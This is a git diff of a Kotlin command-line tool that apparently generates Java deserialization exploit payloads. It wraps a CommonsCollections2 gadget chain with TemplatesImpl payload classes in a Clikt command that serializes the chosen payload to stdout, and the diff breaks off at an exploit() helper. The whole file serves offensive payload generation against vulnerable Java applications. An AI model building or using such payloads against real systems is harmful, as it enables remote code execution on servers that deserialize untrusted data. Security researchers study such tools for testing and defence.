@@ -1,17 +1,28 @@
 package com.xhstormr.app
 
+import com.github.ajalt.clikt.core.CliktCommand
+import com.github.ajalt.clikt.parameters.options.option
+import com.github.ajalt.clikt.parameters.options.required
+import com.github.ajalt.clikt.parameters.types.enum
 import java.io.ByteArrayInputStream
 import java.io.ObjectInputStream
 import java.util.Base64
 
-fun main(args: Array<String>) {
-    // exploit(CommonsCollections2ObjectPayload, TemplatesImplPayload1::class.java)
-    // exploit(CommonsCollections2ObjectPayload, TemplatesImplPayload2::class.java)
+object App : CliktCommand(printHelpOnEmptyArgs = true) {
 
-    CommonsCollections2ObjectPayload
-        .getObject(TemplatesImplPayload1::class.java)
-        .serialize(System.out)
+    private val payload by option().enum<Payload>().required()
+
+    override fun run() {
+        // exploit(CommonsCollections2ObjectPayload, clazz<TemplatesImplPayload1>())
+        // exploit(CommonsCollections2ObjectPayload, clazz<TemplatesImplPayload2>())
+
+        CommonsCollections2ObjectPayload
+            .getObject(payload.clazz)
+            .serialize(System.out)
+    }
 }
+
+fun main(args: Array<String>) = App.main(args)
 
 fun exploit(payload: ObjectPayload, clazz: Class<*>) {
     try {
